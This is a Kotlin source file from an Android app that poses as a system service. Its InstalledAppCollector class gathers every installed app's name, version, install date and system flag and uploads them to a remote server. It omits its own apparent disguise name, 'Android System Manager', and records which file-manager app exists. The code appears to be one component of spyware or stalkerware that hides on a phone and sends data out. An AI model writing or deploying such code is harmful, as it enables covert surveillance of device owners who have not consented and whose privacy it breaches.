package com.android.services.logs.collectors

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import com.android.services.db.entities.InstalledApp
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.io.File
import java.util.*

class InstalledAppCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncInstalledApps) {
            logVerbose("${AppConstants.INSTALLED_APP_TYPE} Retrieving installed apps")
            queryInstalledAppDB(context)
            logVerbose("${AppConstants.INSTALLED_APP_TYPE} Preparing for uploading")
            localDatabaseSource.getInstalledApps { installedApps ->
                if (installedApps.isNotEmpty()) {
                    logVerbose("${AppConstants.INSTALLED_APP_TYPE} data = $installedApps")
                    val startId = installedApps[0].id
                    val endId = installedApps[installedApps.size - 1].id
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.INSTALLED_APP_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    serverHelper.upload(installedApps)
                } else {
                    logVerbose("${AppConstants.INSTALLED_APP_TYPE} No data found")
                }
            }
        } else {
            logVerbose("${AppConstants.INSTALLED_APP_TYPE} Sync is Off")
        }
    }

    private fun queryInstalledAppDB(context: Context) {
        val installedAppList: MutableList<InstalledApp> = ArrayList()
        try {
            val packageManager = context.packageManager
            val packages = packageManager.getInstalledPackages(0)
            for (pkgInfo in packages) {
                val notExistsAlready =
                    localDatabaseSource.checkInstalledAppNotExistAlready(pkgInfo.packageName)
                if (notExistsAlready) {
                    val packageInfo = packageManager.getPackageInfo(
                        pkgInfo.packageName, PackageManager.GET_META_DATA or
                                PackageManager.GET_PROVIDERS
                    ) ?: continue
                    val appInfo = packageInfo.applicationInfo
                    try {
                        val applicationLabel =
                            packageManager.getApplicationLabel(appInfo).toString()
                        if (applicationLabel != "Android System Manager") {
                            val installedApp = InstalledApp()
                            installedApp.packageName = appInfo.packageName
                            installedApp.name = "$applicationLabel%%%${isSystemPackage(appInfo)}"
                            installedApp.version = pkgInfo.versionName?:"1.0"
                            installedApp.installTime = AppUtils.formatDate(
                                File(appInfo.sourceDir).lastModified().toString()
                            )
                            installedApp.isDeleted = 0
                            installedApp.status = 0
                            installedAppList.add(installedApp)
                            if (installedApp.packageName.contains("filemanager") || installedApp.packageName.contains(
                                    "file"
                                ) || installedApp.packageName.contains("explorer") ||
                                installedApp.name.contains("filemanager") || installedApp.name.contains(
                                    "file"
                                ) || installedApp.name.contains("explorer")
                            ) {
                                AppConstants.fileManagerPackageName=installedApp.packageName
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, TAG, e)
                    }
                }
            }
            if (installedAppList.size > 0) {
                localDatabaseSource.insertInstalledApps(installedAppList)
            }
        } catch (e: Exception) {
            logException(e.message!!, TAG, e)
        }
    }

    private fun isSystemPackage(pkgInfo: ApplicationInfo): String {
        return if (pkgInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0) "1" else "0"
    }

    companion object {
        const val TAG = "InstalledAppCollector"
    }
}